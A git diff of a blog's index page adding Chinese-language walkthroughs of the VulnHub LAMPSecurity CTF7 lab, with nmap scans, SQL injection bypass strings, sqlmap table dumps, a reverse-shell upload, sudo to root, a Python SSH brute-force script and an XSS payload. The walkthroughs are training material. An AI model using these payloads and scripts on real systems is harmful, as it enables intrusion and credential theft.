@@ -75,6 +75,272 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-vulnhub-LAMPSecurity-CTF7-initial-error" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" class="article-date">
+  <time class="dt-published" datetime="2024-03-21T04:27:36.000Z" itemprop="datePublished">2024-03-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/">vulnhub-LAMPSecurity-CTF7-initial-error</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF7靶机初始化"><a href="#CTF7靶机初始化" class="headerlink" title="CTF7靶机初始化"></a>CTF7靶机初始化</h1><p>​	解压缩CTF7plusDocs.zip后，部署完靶机环境，进入kali 使用netdiscover进行搜索时发现在同一网段下的CTF7靶机，发现并没有有效IP生成</p>
+<p>​	尝试通过登录靶机解决问题:</p>
+<p><strong>进入CTF7系统                                账户:root                密码:root55pass</strong></p>
+<h2 id="1-故障诊断"><a href="#1-故障诊断" class="headerlink" title="1. 故障诊断"></a>1. 故障诊断</h2><p>​	使用 <code>ip a</code> 查看当前网络信息，发现当前网络设备eth1并未获取到正确的IPv4地址 </p>
+<p><img src="/images/image-20240321095804407.png" alt="image-20240321095804407"></p>
+<p>​	尝试重启网卡</p>
+<blockquote>
+<p>service network restart</p>
+</blockquote>
+<p><img src="/images/image-20240321095828804.png" alt="image-20240321095828804"></p>
+<p>​	结果出现以下问题：</p>
+<blockquote>
+<h3 id="Bringing-up-interface-eth0-Device-eth0-does-not-seem-to-be-present-delaying-initialization"><a href="#Bringing-up-interface-eth0-Device-eth0-does-not-seem-to-be-present-delaying-initialization" class="headerlink" title="Bringing up interface eth0: Device eth0 does not seem to be present,delaying initialization"></a>Bringing up interface eth0: Device eth0 does not seem to be present,delaying initialization</h3></blockquote>
+<p>​	判断可能是网卡配置文件出现了问题</p>
+<h2 id="2-故障修复"><a href="#2-故障修复" class="headerlink" title="2. 故障修复"></a>2. 故障修复</h2><h3 id="2-1-删除持久化网络设备配置文件"><a href="#2-1-删除持久化网络设备配置文件" class="headerlink" title="2.1 删除持久化网络设备配置文件"></a>2.1 删除持久化网络设备配置文件</h3><blockquote>
+<p>rm -rf &#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules</p>
+</blockquote>
+<h3 id="2-2-编辑本地的网卡配置文件"><a href="#2-2-编辑本地的网卡配置文件" class="headerlink" title="2.2 编辑本地的网卡配置文件"></a>2.2 编辑本地的网卡配置文件</h3><blockquote>
+<p>vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p>
+</blockquote>
+<p><img src="/images/image-20240321100132662.png" alt="image-20240321100132662"></p>
+<ul>
+<li>查看 DEVICE，若是device&#x3D;”eth1”修改为device&#x3D;”eth0”</li>
+<li>删除 UUID 字段</li>
+<li>删除 HWADDR 字段</li>
+</ul>
+<p>​	然后重启reboot。</p>
+<p>​	重启完成再次进行 <code>ip -a</code> 查看：</p>
+<p><img src="/images/image-20240321100401885.png" alt="image-20240321100401885"></p>
+<p>​	成功获取到IP地址</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu0qloqq000i1ovd19ck3yaw" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-vulnhub-LAMPSecurity-CTF7" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7/" class="article-date">
+  <time class="dt-published" datetime="2024-03-21T04:27:28.000Z" itemprop="datePublished">2024-03-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/21/vulnhub-LAMPSecurity-CTF7/">vulnhub-LAMPSecurity-CTF7</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h1 id="CTF7靶机"><a href="#CTF7靶机" class="headerlink" title="CTF7靶机"></a>CTF7靶机</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>192.168.134.1</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>192.168.134.152</td>
+</tr>
+</tbody></table>
+<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
+<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
+</blockquote>
+<p><img src="/images/image-20230323104109088.png" alt="image-20230323104109088"></p>
+<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
+<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.154</p>
+</blockquote>
+<p><img src="/images/image-20230323104254505.png" alt="image-20230323104254505"></p>
+<p>​	可以看出当前靶场开放较多端口，这里的话重点关注22、80、5900、8080</p>
+<h3 id="2-2-TCP服务开放性探测"><a href="#2-2-TCP服务开放性探测" class="headerlink" title="2.2 TCP服务开放性探测"></a>2.2 TCP服务开放性探测</h3><blockquote>
+<p>sudo nmap -sT -sV -sC -O -p 22,80,137,138,139,901,5900,8080,10000 192.168.134.154</p>
+</blockquote>
+<p><img src="/images/1679539633057.png" alt="1679539633057"></p>
+<p>​	可以发现在 8080 端口处存在一个 <code>/login.php</code> 的登录功能点</p>
+<h3 id="2-3-UDP服务开放性探测"><a href="#2-3-UDP服务开放性探测" class="headerlink" title="2.3 UDP服务开放性探测"></a>2.3 UDP服务开放性探测</h3><blockquote>
+<p>sudo nmap –min-rate 10000 -p- sU -v 192.168.134.154</p>
+</blockquote>
+<p><img src="/images/image-20230323104626260.png" alt="image-20230323104626260"></p>
+<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
+<p>sudo nmap –script&#x3D;vuln -p 22,80,137,138,139,901,5900,8080,10000 192.168.134.154</p>
+</blockquote>
+<p><img src="/images/image-20230323105141750.png" alt="image-20230323105141750"></p>
+<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对8080端口admin后台登录界面进行测试"><a href="#3-1-根据Nmap扫描结果，对8080端口admin后台登录界面进行测试" class="headerlink" title="3.1 根据Nmap扫描结果，对8080端口admin后台登录界面进行测试"></a>3.1 根据Nmap扫描结果，对8080端口admin后台登录界面进行测试</h3><p>​		通过前面的资产扫面可以发现在8080端口下存在一个后台登陆界面，简单的来个SQL注入测试</p>
+<p><img src="/images/image-20230323110553762.png" alt="image-20230323110553762"></p>
+<h3 id="3-2-万能密码登录Admin后台-SQL注入"><a href="#3-2-万能密码登录Admin后台-SQL注入" class="headerlink" title="3.2 万能密码登录Admin后台&#x2F;SQL注入"></a>3.2 万能密码登录Admin后台&#x2F;SQL注入</h3><p>​	在username和password框中各输入一个引号，放包观察页面内容</p>
+<p><img src="/images/image-20240321102646131.png" alt="image-20240321102646131"></p>
+<p>​	页面回显异常:</p>
+<blockquote>
+<p>Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’) and is_admin&#x3D;1’ at line 1 Whole query: select * from users where username&#x3D;’admin’’ AND password&#x3D;md5(‘admin’’) and is_admin&#x3D;1</p>
+</blockquote>
+<p><img src="/images/image-20230323111254165.png" alt="image-20230323111254165"></p>
+<p>​		说明在登陆端口处存在SQL注入，并且发现当前的SQL语句为:select * from users where username&#x3D;’’ AND password&#x3D;md5(‘’) and is_admin&#x3D;1</p>
+<p>​		</p>
+<h4 id="3-2-1-万能密码登录Admin后台"><a href="#3-2-1-万能密码登录Admin后台" class="headerlink" title="3.2.1 万能密码登录Admin后台"></a>3.2.1 万能密码登录Admin后台</h4><p>​	我们尝试使用万能密码进行登录</p>
+<blockquote>
+<p>用户名：admin’ or 1&#x3D;1 – wq</p>
+<p>密码：admin’) or 1&#x3D;1 – wq</p>
+</blockquote>
+<p><img src="/images/image-20230323111402750.png" alt="image-20230323111402750"></p>
+<p>​		成功登录站点后台 <code>http://192.168.70.197:8080/index.php</code></p>
+<p><img src="/images/image-20230323111419988.png" alt="image-20230323111419988"></p>
+<h4 id="3-2-2-sqlmap后台数据获取"><a href="#3-2-2-sqlmap后台数据获取" class="headerlink" title="3.2.2 sqlmap后台数据获取"></a>3.2.2 sqlmap后台数据获取</h4><p>​	在8080端口SQL注入处使用sqlmap脱下所有的数据看看</p>
+<blockquote>
+<p>sqlmap -r login.txt –banner </p>
+<p>sqlmap -r login.txt –dbms mysql –dbs</p>
+<h3 id="roundcube-库中的user表单数据查询"><a href="#roundcube-库中的user表单数据查询" class="headerlink" title="roundcube 库中的user表单数据查询"></a>roundcube 库中的user表单数据查询</h3><p>sqlmap -r login.txt –dbms mysql -D roundcube –tables</p>
+<p>sqlmap -r login.txt –dbms mysql -D roundcube -T users –dump</p>
+<h3 id="website-库中的user表单数据查询"><a href="#website-库中的user表单数据查询" class="headerlink" title="website 库中的user表单数据查询"></a>website 库中的user表单数据查询</h3><p>sqlmap -r login.txt –dbms mysql -D website –tables</p>
+<p>sqlmap -r login.txt –dbms mysql -D website -T users –dump</p>
+</blockquote>
+<p><img src="/images/image-20230323111908460.png" alt="image-20230323111908460"></p>
+<p><img src="/images/image-20230323111956185.png" alt="image-20230323111956185"></p>
+<p><img src="/images/image-20230323112059019.png" alt="image-20230323112059019"></p>
+<p><img src="/images/image-20230323112114743.png" alt="image-20230323112114743"></p>
+<p>​		可以发现roundcube库中的user表单中不存在能够利用的数据</p>
+<p><img src="/images/image-20230323112932532.png" alt="image-20230323112932532"></p>
+<h3 id="3-4-路径爆破"><a href="#3-4-路径爆破" class="headerlink" title="3.4 路径爆破"></a>3.4 路径爆破</h3><p>​	因为服务器端开放22端口，对上面获取到的账号密码尝试使用ssh密码喷射，但是都无法登录SSH，这时候我们只能重新对资产进行一波信息搜集</p>
+<p>​	这里尝试对80端口服务进行探测</p>
+<p><img src="/images/image-20230323131205788.png" alt="image-20230323131205788"></p>
+<p>​	这里我们发现了一个很有趣的文件目录<code>/assets</code>，这个目录存放了一些文件，尝试访问可以发现是一对图标文件</p>
+<p><img src="/images/image-20240321103323615.png" alt="image-20240321103323615"></p>
+<p>​	猜测这个文件夹可能是用于存放上传资源的路径，这时就需要去查找相关上传点。</p>
+<p>​	经过测试发现可以在<code>http://192.168.70.197:8080/readings.php</code>(管理员界面推广的Reading读物的预览)界面上传文件至<code>http://192.168.70.197/assets</code>，那么就可以尝试我们去提交一个恶意文件，然后尝试获取链接</p>
+<p><img src="/images/image-20230323131503469.png" alt="image-20230323131503469"></p>
+<p><img src="/images/image-20230323131449824.png" alt="image-20230323131449824"></p>
+<h3 id="3-5-文件上传GetShell"><a href="#3-5-文件上传GetShell" class="headerlink" title="3.5 文件上传GetShell"></a>3.5 文件上传GetShell</h3><p>​	使用msfvenom创建一个PHP的反弹shell文件，保存并命名为hack.php</p>
+<p><img src="/images/image-20230323131420290.png" alt="image-20230323131420290"></p>
+<p>​	将文件通过<code>Add a new Readings</code>上传至<code>/assets</code>文件夹目录</p>
+<p><img src="/images/image-20230323131522965.png" alt="image-20230323131522965"></p>
+<p>​	访问 <code>http://192.168.70.197/assets</code> 成功将木马文件上传至指定地点</p>
+<p><img src="/images/image-20230323131533810.png" alt="image-20230323131533810"></p>
+<h3 id="3-6-建立通信隧道链接"><a href="#3-6-建立通信隧道链接" class="headerlink" title="3.6 建立通信隧道链接"></a>3.6 建立通信隧道链接</h3><p>​		打开msfconsole，建立监听隧道</p>
+<p><img src="/images/image-20230323131630163.png" alt="image-20230323131630163"></p>
+<p>​		访问恶意文件，成功反弹shell</p>
+<p><img src="/images/image-20230323131711399.png" alt="image-20230323131711399"></p>
+<p><img src="/images/image-20230323131718925.png" alt="image-20230323131718925"></p>
+<h3 id="3-7-用户提权"><a href="#3-7-用户提权" class="headerlink" title="3.7 用户提权"></a>3.7 用户提权</h3><p>​		一开始获得的用户权限是<code>apache</code>，这个权限无法执行任何操作。这时候我们就需要获取更高权限的用户，首先想到的是<code>/home</code>文件夹下存在几个和我们爆出的数据库用户名同名的文件夹，我们分别切换到这些账号中，发现能够顺利切换用户</p>
+<p><img src="/images/image-20230323132518344.png" alt="image-20230323132518344"></p>
+<p>​		但是其他几个用户都没有权限，无法执行sudo提权</p>
+<p><img src="/images/image-20230323141156139.png" alt="image-20230323141156139"></p>
+<p>​		最后经过测试只有第一个brian用户才拥有所有命令的执行权限，那么就通过</p>
+<blockquote>
+<p>sudo &#x2F;bin&#x2F;bash </p>
+</blockquote>
+<p>获取一个root权限的shell对话框</p>
+<p><img src="/images/image-20230323141126102.png" alt="image-20230323141126102"></p>
+<p><img src="/images/1679551930000.png" alt="1679551930000"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu0qloqy000k1ovd3ykch85f" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-vulnhub-LAMPSecurity-CTF7-external" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" class="article-date">
+  <time class="dt-published" datetime="2024-03-21T04:27:24.000Z" itemprop="datePublished">2024-03-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/">vulnhub-LAMPSecurity-CTF7-external</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF7靶机探索"><a href="#CTF7靶机探索" class="headerlink" title="CTF7靶机探索"></a>CTF7靶机探索</h1><h2 id="1-SSH-root-用户弱口令"><a href="#1-SSH-root-用户弱口令" class="headerlink" title="1. SSH root 用户弱口令"></a>1. SSH root 用户弱口令</h2><p>​	编写一个简单的SSH弱口令爆破程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pass.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    password_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;user.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    user_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_lists:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> password_lists:</span><br><span class="line">        cmd = <span class="string">&quot;sshpass -p &#123;&#125; ssh &#123;&#125;@192.168.70.197 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oCiphers=+3des-cbc&quot;</span>.<span class="built_in">format</span>(password, user)</span><br><span class="line">        res = os.system(cmd)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1280</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;username: &#123;&#125;\tpassword: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, password))</span><br></pre></td></tr></table></figure>
+
+<p>​	这里为什么不适用hydra这类的工具，因为靶机的密钥加密算法版本比较老，而Hydra 是一个用于密码破解和暴力破解的工具，通常用于测试系统的安全性和进行合法的渗透测试。它主要关注用户名和密码的破解，而不是密钥算法的选择，容易遇到到了密钥算法不匹配的问题。<img src="/images/image-20240321112032069.png" alt="image-20240321112032069"></p>
+<h2 id="2-后台添加用户处存在SQL注入"><a href="#2-后台添加用户处存在SQL注入" class="headerlink" title="2. 后台添加用户处存在SQL注入"></a>2. 后台添加用户处存在SQL注入</h2><p>​	发现在 <a target="_blank" rel="noopener" href="http://192.168.70.197:8080/users.php?op=new_scr">http://192.168.70.197:8080/users.php?op=new_scr</a> (添加用户功能点)处存在SQL注入漏洞</p>
+<p><img src="/images/image-20240321112503733.png" alt="image-20240321112503733"></p>
+<h2 id="3-编辑处存在XSS漏洞"><a href="#3-编辑处存在XSS漏洞" class="headerlink" title="3. 编辑处存在XSS漏洞"></a>3. 编辑处存在XSS漏洞</h2><p>​	我们尝试对已有的内容进行编辑’<a target="_blank" rel="noopener" href="http://192.168.70.197:8080/trainings.php?msg=Updated%27%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E7%BC%96%E8%BE%91%E7%9A%84%E6%98%AFTrainings%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9">http://192.168.70.197:8080/trainings.php?msg=Updated&#39;，这里我编辑的是Trainings中的内容</a></p>
+<p>​	在所有的条目中插入代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	更新保存后，成功弹窗</p>
+<p><img src="/images/image-20240321112957947.png" alt="image-20240321112957947"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu0qloqp000h1ovdgwz6dg03" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-tools-sqlmap-script-build" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/21/tools-sqlmap-script-build/" class="article-date">
@@ -122,7 +388,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu01k36d000acuvdbxsyaumz" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu0qloqj000a1ovd1hwp4c0j" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -215,7 +481,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu01k3660003cuvdd4xq936k" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu0qloq100031ovdh57397zp" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -315,7 +581,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu01k3690005cuvd657e50d6" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu0qloq500051ovd7yyzclxn" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -381,7 +647,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu01k36a0006cuvd5ruchz0p" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu0qloqg00061ovdhtdqhar4" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -507,7 +773,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="clu01k3620001cuvd8fnk4kds" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="clu0qlopw00011ovdda9vdr71" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -654,7 +920,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="clu01k36b0007cuvdacy8ew7j" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="clu0qloqh00071ovd55xu9mwe" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -715,293 +981,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="clu01k36g000dcuvdb1e6ge9v" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-vulnhub-LAMPSecurity-CTF5-md" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" class="article-date">
-  <time class="dt-published" datetime="2024-03-14T11:03:36.000Z" itemprop="datePublished">2024-03-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/">vulnhub-LAMPSecurity-CTF5.md</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>[toc]</p>
-<h1 id="CTF5-靶场"><a href="#CTF5-靶场" class="headerlink" title="CTF5 靶场"></a>CTF5 靶场</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
-<thead>
-<tr>
-<th>主机</th>
-<th>IP</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>攻击机</td>
-<td>192.168.134.1</td>
-</tr>
-<tr>
-<td>靶机</td>
-<td>192.168.134.152</td>
-</tr>
-</tbody></table>
-<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
-<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
-</blockquote>
-<p><img src="/images/image-20230317162053217.png" alt="image-20230317162053217"></p>
-<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
-<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.152</p>
-</blockquote>
-<p><img src="/images/image-20230317162537416.png" alt="image-20230317162537416"></p>
-<p>​	可以看出当前靶场开放较多端口，这里的话重点关注22、80、3306</p>
-<h3 id="2-2-TCP服务开放性探测"><a href="#2-2-TCP服务开放性探测" class="headerlink" title="2.2 TCP服务开放性探测"></a>2.2 TCP服务开放性探测</h3><blockquote>
-<p>sudo nmap -sT -sV -sC -A -O -p- 192.168.134.152</p>
-</blockquote>
-<p><img src="/images/image-20230317162830184.png" alt="image-20230317162830184"></p>
-<h3 id="2-3-UDP服务开放性探测"><a href="#2-3-UDP服务开放性探测" class="headerlink" title="2.3 UDP服务开放性探测"></a>2.3 UDP服务开放性探测</h3><blockquote>
-<p>sudo nmap –min-rate 10000 -p- sU -v 192.168.134.152</p>
-</blockquote>
-<p><img src="/images/image-20230317162506365.png" alt="image-20230317162506365"></p>
-<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
-<p>sudo nmap –script&#x3D;vuln -p 22,25,80,110,111,139,143,445,901,3306,50156 192.168.134.152</p>
-</blockquote>
-<p><img src="/images/image-20230317163344786.png" alt="image-20230317163344786"></p>
-<p>​	发现存在phpmyadmin目录，也发现了其他几个可能存在敏感信息泄漏的文件，例如info.php</p>
-<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对80端口web服务进行测试"><a href="#3-1-根据Nmap扫描结果，对80端口web服务进行测试" class="headerlink" title="3.1.  根据Nmap扫描结果，对80端口web服务进行测试"></a>3.1.  根据Nmap扫描结果，对80端口web服务进行测试</h3><h4 id="3-1-1-访问-http-192-168-70-193-info-php"><a href="#3-1-1-访问-http-192-168-70-193-info-php" class="headerlink" title="3.1.1 访问 http://192.168.70.193/info.php:"></a>3.1.1 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/info.php">http://192.168.70.193/info.php</a>:</h4><p><img src="/images/image-20240314182459680.png" alt="image-20240314182459680"></p>
-<h4 id="3-1-2-访问-http-192-168-70-193-phpmyadmin"><a href="#3-1-2-访问-http-192-168-70-193-phpmyadmin" class="headerlink" title="3.1.2 访问 http://192.168.70.193/phpmyadmin:"></a>3.1.2 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/phpmyadmin">http://192.168.70.193/phpmyadmin</a>:</h4><p><img src="/images/image-20240314182522165.png" alt="image-20240314182522165"></p>
-<h4 id="3-1-3-访问-http-192-168-70-193-inc-php"><a href="#3-1-3-访问-http-192-168-70-193-inc-php" class="headerlink" title="3.1.3 访问 http://192.168.70.193/inc.php:"></a>3.1.3 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/inc.php">http://192.168.70.193/inc.php</a>:</h4><p><img src="/images/image-20240314182622132.png" alt="image-20240314182622132"></p>
-<h4 id="3-1-4-访问-http-192-168-70-193-andy-index-php"><a href="#3-1-4-访问-http-192-168-70-193-andy-index-php" class="headerlink" title="3.1.4 访问 http://192.168.70.193/~andy/index.php:"></a>3.1.4 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php">http://192.168.70.193/~andy/index.php</a>:</h4><blockquote>
-<p>可以发现当点击Navigation时，不同的页面调整是通过page参数控制的:</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.134.152/~andy/index.php?page=home">http://192.168.134.152/~andy/index.php?page=home</a></p>
-</blockquote>
